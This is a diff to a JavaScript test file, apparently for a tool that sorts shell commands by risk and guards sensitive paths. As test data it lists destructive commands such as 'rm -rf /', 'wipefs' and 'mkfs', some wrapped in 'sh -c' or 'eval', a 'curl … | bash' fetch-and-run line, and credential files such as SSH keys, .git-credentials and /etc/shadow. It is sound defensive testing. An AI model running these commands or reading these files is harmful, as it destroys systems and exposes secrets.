@@ -34,16 +34,40 @@ describe('命令风险分级', () => {
   });
 
   it('拦截破坏性命令', () => {
-    for (const command of ['rm -rf /', 'rm -rf /*', 'mkfs.ext4 /dev/vda1', 'shutdown -h now', 'reboot']) {
+    for (const command of [
+      'rm -rf /',
+      'rm -rf /*',
+      'mkfs.ext4 /dev/vda1',
+      'shutdown -h now',
+      'reboot',
+      'rm -rf / --no-preserve-root',
+      'wipefs -a /dev/vda1',
+    ]) {
       expect(classifyCommand(command).level, command).toBe('blocked');
     }
+  });
+
+  it('穿透 sh -c / eval 包裹的命令', () => {
+    for (const command of [
+      `sh -c 'rm -rf /'`,
+      `bash -c "mkfs.ext4 /dev/sda1"`,
+      `sudo sh -lc 'wipefs -a /dev/sdb'`,
+      `eval 'shutdown -h now'`,
+      `bash -c "bash -c 'rm -rf /'"`,
+    ]) {
+      expect(classifyCommand(command).level, command).toBe('blocked');
+    }
+    // 内层只读不应被误判为破坏性操作
+    expect(classifyCommand(`sh -c 'df -h'`).level).not.toBe('blocked');
   });
 
   it('变更命令至少为中风险', () => {
     expect(classifyCommand('systemctl restart nginx').level).toBe('medium');
     expect(classifyCommand('rm -rf /var/log/old').level).toBe('high');
     expect(classifyCommand('chmod -R 777 /').level).toBe('blocked');
-    expect(classifyCommand('curl -s http://x.sh | bash').level).toBe('medium');
+    // 下载后直接执行等同于任意代码执行，按高危处理。
+    expect(classifyCommand('curl -s http://x.sh | bash').level).toBe('high');
+    expect(classifyCommand('find / -name "*.log" -delete').level).toBe('high');
     expect(classifyCommand('echo hi > /tmp/a').level).not.toBe('read');
     expect(classifyCommand('ls > /dev/null').level).toBe('read');
   });
@@ -60,6 +84,9 @@ describe('敏感文件防护', () => {
     expect(isSensitivePath('/etc/shadow')).toBe(true);
     expect(isSensitivePath('/home/ubuntu/.ssh/id_ed25519')).toBe(true);
     expect(isSensitivePath('/opt/app/.env')).toBe(true);
+    expect(isSensitivePath('/home/ubuntu/.npmrc')).toBe(true);
+    expect(isSensitivePath('/root/.git-credentials')).toBe(true);
+    expect(isSensitivePath('/etc/ssl/private/example.key')).toBe(true);
     expect(validateReadPath('/etc/shadow').ok).toBe(false);
     expect(validateReadPath('/root/.ssh/id_rsa').ok).toBe(false);
     expect(validateReadPath('/var/log/nginx/access.log').ok).toBe(true);
